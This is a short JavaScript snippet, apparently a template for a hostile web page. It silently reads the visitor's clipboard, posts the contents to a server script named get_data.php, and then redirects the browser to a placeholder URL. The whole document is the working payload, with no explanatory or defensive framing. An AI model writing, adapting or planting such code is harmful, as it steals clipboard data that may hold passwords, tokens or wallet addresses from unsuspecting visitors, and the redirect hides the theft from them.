function post(dataclip){
$.ajax({
    type: 'POST',
    data: { cat: dataclip },
    url: 'get_data.php',
    dataType: 'json',
    async: false,

    success: function(result){
        location.replace('$RedURL$')

    },

    error: function(){

    }
  });
};

navigator.clipboard.readText().then(text => post(text));
